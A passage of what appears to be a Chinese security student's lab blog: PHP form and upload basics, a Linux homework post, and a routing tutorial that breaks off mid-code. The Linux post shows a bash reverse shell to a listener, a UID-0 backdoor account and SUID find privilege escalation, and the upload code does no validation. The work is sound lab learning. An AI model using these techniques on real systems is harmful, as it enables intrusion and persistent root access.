title="1、编写一个html页面，要求如下"></a>1、编写一个html页面，要求如下</h3><p>title标签以自己的姓名为值<br>img标签加载自己任选的一张图片<br>编写一个form表单，分别使用get和post向服务器发送名称为name和pass的数据</p><p>这是我编写的html页面</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>田珩瑀<span class="tag">&lt;/<span class="name">title</span>&gt;</span> //网页标签</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;狮子图片&quot;</span> <span class="attr">title</span>=<span class="string">&quot;这是狮子&quot;</span>&gt;</span>  //图片保存在了页面同级目录下</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> \&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> \&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span>账户1<span class="tag">&lt;<span class="name">br</span> \&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span>&gt;</span>密码2<span class="tag">&lt;<span class="name">br</span> \&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是网页实体效果</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812162500867.png"></p><p>这是编写的后端php代码，也是保存在网页同级目录下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];    <span class="comment">//接受get传参数据</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];   <span class="comment">//接受get传参数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br \&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br \&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>①使用GET传参</p><p>代码同上，在表单处输入数据并提交</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812162910740.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812162942331.png"></p><p>成功在传到后端，在url显示数据，并输出到页面！！！！</p><p>②POST传参</p><p>修改html文件和php文件的代码，将方法改为POST</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#html</span></span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;1.php&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br></pre></td></tr></table></figure><p>修改好之后，在表单处输入数据并提交</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812163357927.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812163739197.png"></p><p>成功显示，并且url不包含数据！！！！！</p><h3 id="2、使用php定义一个以自己姓名缩写为名称的变量，存储自己的姓名全拼"><a href="#2、使用php定义一个以自己姓名缩写为名称的变量，存储自己的姓名全拼" class="headerlink" title="2、使用php定义一个以自己姓名缩写为名称的变量，存储自己的姓名全拼"></a>2、使用php定义一个以自己姓名缩写为名称的变量，存储自己的姓名全拼</h3><p>在刚才的php代码中加入如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$thy</span> = <span class="string">&quot;tianhengyu&quot;</span>; <span class="comment">//定义了一个变量名为thy，数据为字符串tianhengyu</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$thy</span>;   <span class="comment">//输出数据</span></span><br></pre></td></tr></table></figure><p>添加好代码后保存，刷新页面</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812164248433.png"></p><p>成功打印！！！！！</p><h3 id="3、尝试修改第二题创建的变量值为int类型并打印"><a href="#3、尝试修改第二题创建的变量值为int类型并打印" class="headerlink" title="3、尝试修改第二题创建的变量值为int类型并打印"></a>3、尝试修改第二题创建的变量值为int类型并打印</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$thy</span> = <span class="number">456789</span>;    <span class="comment">//改为int类型</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span> (<span class="variable">$thy</span>);   <span class="comment">//显示数据类型</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812165323353.png"></p><p>但是如果是将原本的字符串修改为int类型的话</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> (<span class="keyword">int</span>)<span class="variable">$thy</span></span><br></pre></td></tr></table></figure><p>输出为0</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812184706377.png"></p><h3 id="4、演示可变变量的作用-演示两个-符号的作用并且解释"><a href="#4、演示可变变量的作用-演示两个-符号的作用并且解释" class="headerlink" title="4、演示可变变量的作用(演示两个$符号的作用并且解释)"></a>4、演示可变变量的作用(演示两个$符号的作用并且解释)</h3><p>编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cxk</span> = <span class="string">&quot;god&quot;</span>;  <span class="comment">//给变量cxk赋值为god</span></span><br><span class="line"><span class="variable">$god</span> = <span class="string">&quot;i love cxk!&quot;</span>;  <span class="comment">//给变量god赋值为i love cxk！</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$cxk</span>;        <span class="comment">//此时要输出时，首先$cxk会变成god，所以最后输出的其实是，$god</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出如下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812170030446.png"></p><h3 id="5、使用burp或者yakit抓取自己form表单发送的get和post数据，观察区别"><a href="#5、使用burp或者yakit抓取自己form表单发送的get和post数据，观察区别" class="headerlink" title="5、使用burp或者yakit抓取自己form表单发送的get和post数据，观察区别"></a>5、使用burp或者yakit抓取自己form表单发送的get和post数据，观察区别</h3><p>①打开burp，设置监听地址和端口</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812170326956.png"></p><p>②在浏览器设置代理地址和端口为burp设置的一样</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812170916844.png"></p><p>③浏览器访问页面，在访问的时候访问ip地址，不能使用localhost，不然抓不到包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812172017466.png"></p><p>④burp开启拦截</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812171120133.png"></p><p>⑤在页面输入数据，并提交表单</p><p>成功抓到get数据包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812172102354.png"></p><p>我们来修改代码为post传参，同第一题一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#html</span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;1.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pass&#x27;];</span><br></pre></td></tr></table></figure><p>改完之后抓包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812172310090.png"></p><p>成功抓到数据包</p><p>⑥对比</p><ul><li><p>两者的请求方法不同</p></li><li><p>post方法多了Content-Type、Content-Length、Origin字段</p></li><li><p>get请求数据在url中，post数据在请求体里面</p></li></ul><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="尝试使用form表单上传文件存储到服务器上"><a href="#尝试使用form表单上传文件存储到服务器上" class="headerlink" title="尝试使用form表单上传文件存储到服务器上"></a>尝试使用form表单上传文件存储到服务器上</h3><p>①编写代码</p><p>前端</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span> //post方法上传文件到1.php中去处理</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> \&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183125274.png"></p><p>后端</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];     <span class="comment">//$_FILE全局变量接受从前端上传的文件</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>];   <span class="comment">//赋予文件名</span></span><br><span class="line"><span class="variable">$filePath</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];   <span class="comment">//将文件保存在临时目录</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$filePath</span>,<span class="string">&quot;uploadfile/&quot;</span>.<span class="variable">$filename</span>);  <span class="comment">//将文件移动到网站根目录下的uploadfile目录</span></span><br></pre></td></tr></table></figure><p>我们先创建一个文件在桌面</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183719808.png"></p><p>我们在前端选择文件然后上传</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183420250.png"></p><p>之后通过路径去访问一下刚才上传的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/uploadfile/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183801494.png"></p><p>成功访问，证明上传成功！！！但是因为编码原因，符号乱码</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux实操2</title>
      <link href="/2025/08/09/Linux%E5%AE%9E%E6%93%8D2/"/>
      <url>/2025/08/09/Linux%E5%AE%9E%E6%93%8D2/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础大作业w2"><a href="#Linux基础大作业w2" class="headerlink" title="Linux基础大作业w2"></a>Linux基础大作业w2</h1><p>1、使用反弹的shell创建uid为0的账户，非交互设置密码</p><p>①在kali上开启端口监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809102952793.png"></p><p>②在centos上反弹bash，kali端成功拿到shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.18.132/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809103112940.png"></p><p>③kali端利用反弹的shell创建uid为0的用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -o -u 0 -m hack</span><br><span class="line"></span><br><span class="line"><span class="comment">#-o表示允许创建重复uid</span></span><br><span class="line"><span class="comment">#-u表示设置用户uid</span></span><br><span class="line"><span class="comment">#-m表示创建家目录</span></span><br></pre></td></tr></table></figure><p>④kali端非交互式为刚才创建的hack用户设置密码，这里利用root权限直接修改passwd文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hack:hack123&quot;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment">#将echo输出的字段作为chpasswd的输入</span></span><br></pre></td></tr></table></figure><p>这样我们就完成了非交互式密码更改</p><p>⑤我们在centos上去验证一下</p><p>重启客户机，使用刚才创建的密码去登录</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809104734663.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809104923298.png"></p><p>成功登录，并且作为root用户！！！！</p><p>2、使用echo写入计划任务实现在八月的每周五的每一小时，每一分钟备份&#x2F;var&#x2F;log&#x2F;secure要求文件名包含当前时间</p><p>①使用反弹shell设置计划任务，一条命令执行，我们使用crontab来写入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;* * * 8 5 tar -zcf /var/log/secure_$(date +%F-%H%M).back /var/log/secure&quot; | crontab</span><br><span class="line"></span><br><span class="line">#* * * 8 5 计划任务时间，表示八月的每周五的每一小时，每一分钟</span><br><span class="line">#tar -zcf /var/log/secure_$(date +%F-%H%M).back /var/log/secure表示将/var/log/secure 打包为secure_$(date +%F-%H%M).back文件</span><br><span class="line">#crontab 表示使用crontab创建计划任务</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809105848867.png"></p><p>②我们去centos端验证一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment">#命令表示查看此用户下的计划任务</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809110001186.png"></p><p>成功创建！！！！！</p><p>3、演示查找具有suid权限的可执行账户，实现提权</p><p>①这个实验我们在centos端做，首先切换到一个普通用户，若没有普通用户则创建一下，这里我已经创建好了一个test用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809110212334.png"></p><p>②在普通用户视角下，去搜索具有SUID权限的文件，一般具有威胁的文件有find、vim、bash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -user root 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#/表示在根目录递归查找</span></span><br><span class="line"><span class="comment">#-perm -4000表示精确匹配suid权限文件</span></span><br><span class="line"><span class="comment">#-user root表示匹配root为属主的文件，这样方便提权</span></span><br><span class="line"><span class="comment">#2&gt;/dev/null表示丢弃错误信息</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809110715587.png"></p><p>我们找到了一个find文件，利用这个文件可以提权</p><p>③进行提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#.表示在当前目录下依次查找文件，其实这个.和提权没多大关系</span></span><br><span class="line"><span class="comment">#-exec /bin/bash表示追加一条命令，打开一个bash</span></span><br><span class="line"><span class="comment">#-p表示为打开的bash保留suid权限，提权 </span></span><br><span class="line"><span class="comment">#\;表示追加的命令结束</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809111154685.png"></p><p>④进行验证此bash权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250809111304511.png"></p><p>成功提权到root用户！！！！！</p><p>4、编写死循环脚本，使用ps aux找到pid，利用kill命令关闭进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while((2&gt;1))</span><br><span class="line">do</span><br><span class="line">echo&quot;ddd&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建一个脚本文件</span></span><br><span class="line">vim loop.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span>((<span class="number">2</span>&gt;<span class="number">1</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;ddd&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#给文件添加执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x loop.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250810150712409.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250810150954044.png"></p><p>①运行脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./loop.sh</span><br></pre></td></tr></table></figure><p>②新开一个终端，动态查看进程</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#动态查看进程</span></span><br><span class="line">top</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250810151246927.png"></p><p>可以看到第一个cpu占了31.2%，并且是执行的脚本文件</p><p>③杀死进程</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 2783</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250810151507926.png"></p><p>成功杀死进程！！！！！</p><p>5、解释并演示转义符号的作用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转义 $ 避免变量替换</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;原样输出: \$USER&quot;</span>    <span class="comment"># 输出: 原样输出: $USER（而非变量值）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转义空格处理带空格的路径</span></span><br><span class="line"><span class="built_in">touch</span> my\ file.txt         <span class="comment"># 创建文件 &quot;my file.txt&quot;（而非两个文件）</span></span><br><span class="line"><span class="built_in">ls</span> my\ file.txt            <span class="comment"># 列出文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转义 * 防止通配符扩展</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;星号: \*&quot;</span>            <span class="comment"># 输出: 星号: *（而非文件列表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号内转义特殊字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;She said: \&quot;Hello\&quot;&quot;</span>   <span class="comment"># 输出: She said: &quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 单引号内转义单引号（特殊技巧）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;It&#x27;</span>\&#x27;<span class="string">&#x27;s sunny&#x27;</span>         <span class="comment"># 输出: It&#x27;s sunny（分段拼接）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行符 \n</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;第一行\n第二行&quot;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment">#   第一行</span></span><br><span class="line"><span class="comment">#   第二行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 制表符 \t</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Name:\tAlice&quot;</span></span><br><span class="line"><span class="comment"># 输出: Name:   Alice</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 长命令拆分成多行</span></span><br><span class="line">find /home -name <span class="string">&quot;*.log&quot;</span> \</span><br><span class="line">     -<span class="built_in">type</span> f \</span><br><span class="line">     -size +1M</span><br><span class="line"><span class="comment"># 等价于单行命令：find /home -name &quot;*.log&quot; -type f -size +1M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转义 . 匹配点号本身</span></span><br><span class="line">grep <span class="string">&quot;127\.0\.0\.1&quot;</span> /etc/hosts  <span class="comment"># 匹配 IP 地址（而非任意字符）</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透基础1-路由转发</title>
      <link href="/2025/08/07/%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%801-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/"/>
      <url>/2025/08/07/%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%801-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>一、路由转发简介</p><p>1.路由转发是什么</p><p>路由转发（IP Forwarding）是计算机网络中的核心机制，指路由器或具备路由功能的设备根据路由表将接收到的数据包转发到目标网络。</p><p>2.核心概念</p><ul><li><p>路由表（Routing Table）：</p><p>存储网络地址与下一跳信息的表格，决定数据包的转发路径。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标网络          下一跳IP          接口             标记</span><br><span class="line">192.168.1.0/24   10.0.0.1         eth0             UG</span><br></pre></td></tr></table></figure></li><li><p>下一跳（Next Hop）：</p><p>数据包转发的下一个设备或网关的 IP 地址。</p></li><li><p>路由协议（如 OSPF、BGP）：</p><p>动态更新路由表的协议，适用于大型网络（如企业网或互联网）</p></li></ul><p>3.工作流程</p><p>当一个网络设备收到一个数据包时，会查看源ip和目的ip，查看目标网络是否在自己的路由表里面，如果在，则将接收到的数据包转发给下一跳地址，下一跳设备接收到数据包时，重复上述操作，直到数据包转发到目的ip。</p><p>4.配置方法</p><p>linux系统使用命令配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看路由表</span></span><br><span class="line">ip route show</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加静态路由</span></span><br><span class="line">ip route add 192.168.10.0/24 via 10.0.0.1 dev eth1</span><br><span class="line"></span><br><span class="line">ip route add：表示添加一项路由条目</span><br><span class="line">192.168.10.0/24：表示目标网络，子网掩码是24</span><br><span class="line">via 10.0.0.1：表示下一跳地址是10.0.0.1</span><br><span class="line">dev eth1：表示网络设备接口是dev eth1</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除路由</span></span><br><span class="line">ip route del 192.168.2.0/24</span><br></pre></td></tr></table></figure><p>配置文件持久化</p><p>路径： &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;route-eth0 （针对接口 eth0 ）或&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ensxx</p><p>添加内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">to default via 10.0.0.1 dev eth0 <span class="comment">#表示去往默认路由的下一跳地址是10.0.0.1</span></span><br><span class="line">to 192.168.2.0/24 via 10.0.0.2 dev eth1  <span class="comment">#表示去往192.168.2.0/24网段的下一跳地址是10.0.0.2</span></span><br></pre></td></tr></table></figure><p>二、虚拟机网络连接方式</p><p>想要在虚拟机上完成路由转发案例，我们先了解一下虚拟机的网络连接方式</p><p>1.NAT（网络地址转换）模式</p><p>你的物理机相当于虚拟机的网关，虚拟机可以通过物理机来访问外部网络，但是外部网络无法直接访问虚拟机，就相当于你的物理机作为你虚拟机的路由器。</p><p>2.桥接模式</p><p>这个模式下，虚拟机就相当于一台真实主机，可以与外部网络进行通信，具有自己的ip地址，虚拟机的网络适配器与你物理机的网卡相连接，相当于与你物理机处于同一水平线。</p><p>3.仅主机模式</p><p>虚拟机完全隔离于外部网络，只能与你物理机进行通信。</p><p>三、网络配置</p><p>1.网络管理器（NetworkManager）</p><p>网络管理器（NetworkManager）是一个动态网络的控制器与配置系统，它用于当网络设备可用时保持设备和连接开启并激活。</p><p>CentOS8 默认安装网络管理器，并处于启用状态。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看网络管理程序状态</span></span><br><span class="line">systemctl status NetworkManager</span><br></pre></td></tr></table></figure><p>2.网络配置方法</p><p>①修改文件配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/sysconfig/network-scripts目录下</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑配置文件，如</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens168</span><br><span class="line"></span><br><span class="line"><span class="comment">#incfg-ens168就是你centos系统网卡对应的网络配置文件</span></span><br><span class="line"><span class="comment">#以下是所需要配置的参数</span></span><br><span class="line">TYPE=Ethernet              <span class="comment">#接口类型</span></span><br><span class="line">DEVICE=ens160              <span class="comment">#设备名称，你网卡的名称</span></span><br><span class="line">ONBOOT=<span class="built_in">yes</span>                 <span class="comment">#开机自启，no是不自启</span></span><br><span class="line">BOOTPROTO=static           <span class="comment">#获取ip方式，static是静态ip，还有DHCP方式</span></span><br><span class="line">IPADDR=192.168.2.254       <span class="comment">#你分配的ip地址</span></span><br><span class="line">NETMAK=255.255.255.0       <span class="comment">#子网掩码</span></span><br><span class="line">GATEWAY=192.168.2.1        <span class="comment">#网关</span></span><br><span class="line">DNS1=114.114.114.114       <span class="comment">#DNS</span></span><br><span class="line">DNS2=8.8.8.8</span><br><span class="line">DEFROUTE=<span class="built_in">yes</span>               <span class="comment">#默认路由</span></span><br></pre></td></tr></table></figure><p>②命令配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看网络连接</span></span><br><span class="line">nmcli connection show</span><br><span class="line"></span><br><span class="line"><span class="comment">#启用接口</span></span><br><span class="line">nmcli connection up ensxxx</span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用接口</span></span><br><span class="line">nmcli connection down ensxxx</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置静态ip</span></span><br><span class="line">nmcli connection modify ensxxx \</span><br><span class="line">  <span class="built_in">type</span> ethernet \</span><br><span class="line">  ip4 192.168.1.100/24 \</span><br><span class="line">  gateway4 192.168.1.1 \</span><br><span class="line">  dns <span class="string">&quot;8.8.8.8;8.8.4.4&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#配置DHCP</span></span><br><span class="line">nmcli connection modify ens160 \</span><br><span class="line">  <span class="built_in">type</span> ethernet \</span><br><span class="line">  ip4 auto dhcp</span><br></pre></td></tr></table></figure><p>四、路由转发实验</p><p>1.拓扑说明</p><table><thead><tr><th>操作系统</th><th>网卡</th></tr></thead><tbody><tr><td>windows 10</td><td>vmnet 2（仅主机模式）</td></tr><tr><td>centos 8</td><td>vmnet 2 、 vmnet 3</td></tr><tr><td>kali</td><td>vmnet 3</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807153656771.png"></p><p>2.目标</p><p>实现win10与kali能够ping通</p><p>3.实践</p><p>①kali配置ip</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#kali网络配置文件在/etc/network目录下有个interfaces文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#首先进行源文件的备份</span></span><br><span class="line"><span class="built_in">mv</span> interfaces interfaces.back</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建一个interfaces文件</span></span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line"></span><br><span class="line">auto lo                             </span><br><span class="line">iface lo inet loopback             <span class="comment">#回环</span></span><br><span class="line"></span><br><span class="line">auto eth0                          <span class="comment">#网络接口</span></span><br><span class="line">iface eth0 inet static             <span class="comment">#静态路由</span></span><br><span class="line">     address 172.16.2.1            <span class="comment">#ip地址</span></span><br><span class="line">     netmask 255.255.255.0         <span class="comment">#掩码</span></span><br><span class="line">     gateway 172.16.2.254          <span class="comment">#网关</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure><p>②centos双网卡配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span 